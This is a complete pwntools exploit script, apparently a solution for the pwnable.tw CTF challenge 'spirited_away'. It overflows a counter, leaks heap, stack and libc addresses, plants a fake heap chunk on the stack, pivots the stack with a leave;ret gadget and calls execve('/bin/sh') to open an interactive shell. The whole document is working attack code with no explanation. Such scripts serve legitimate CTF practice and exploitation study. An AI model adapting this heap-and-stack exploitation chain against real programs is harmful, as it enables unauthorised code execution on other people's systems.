from pwn import *

#p = process(["./ld-2.23.so","./spirited_away"],env = {"LD_PRELOAD":"./libc-2.23.so"})
#libc = ELF("./libc-2.23.so")

p = process(["./ld-2.23.so","./spirited_away"],env = {"LD_PRELOAD":"./libc_32.so.6"})
#p = remote("chall.pwnable.tw",10204)
libc = ELF("./libc_32.so.6")
elf = ELF("./spirited_away")


for i in range(0,10):	
	p.sendlineafter("name:","A"*4)
	p.sendlineafter("age:","1")
	p.sendlineafter("movie?","nop")
	p.sendlineafter("comment: ","nop")
	p.sendlineafter("<y/n>:","y")

for i in range(0,90):
	p.sendlineafter("age:","1")
	p.sendlineafter("movie?","nop")
	p.sendlineafter("<y/n>:","y")


p.sendafter("name:","C"*4)
p.sendlineafter("age:",str(0x41414141))
p.sendafter("movie?","E"*0x30 + "F"*8)
p.sendafter("comment: ","B"*0x50)

p.recvuntil("BBAAAA")
heap_name = u32(p.recv(4))

p.recvuntil("EEFFFFFFFF")

leave_ret = 0x08048578
stack = u32(p.recv(4))-0x68
stack_pivot = stack-0x60
#libc_base = u32(p.recv(4)) - 0x1ccda0  #local
libc_base = u32(p.recv(4)) - 0x1cdda0  #remote

system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
execve = libc_base + libc.sym['execve']

print "[+] heap_name : " + hex(heap_name)
print "[+] stack : " + hex(stack)
print "[+] libc_base : " + hex(libc_base)
print "[+] system : " + hex(system)
print "[+] binsh : " + hex(binsh)
print "[+] execve : " + hex(execve)

p.sendlineafter("<y/n>:","y")


p.sendafter("name:","C"*4)
p.sendlineafter("age:",str(0x41414141))
p.sendafter("movie?", 'E'*4 + p32(0x41) +'E'*0x3c  + p32(0x41))
p.sendafter("comment: ","B"*0x50 + "C"*4 + p32(stack))

p.sendlineafter("<y/n>:","y")

p.sendafter("name:","A"*0x48 + p32(stack_pivot) + p32(leave_ret))
p.sendlineafter("age:",str(0x41414141))
p.sendafter("movie?", 'E'*4 + p32(0x41) +'E'*0x3c  + p32(0x41))


payload = p32(stack) #ebp new
payload += p32(execve)
payload += p32(binsh)
payload += p32(binsh)
payload += p32(0)
p.sendafter("comment: ",payload)


#gdb.attach(p)

p.sendlineafter("<y/n>:","n")


p.sendline("ls")
p.interactive()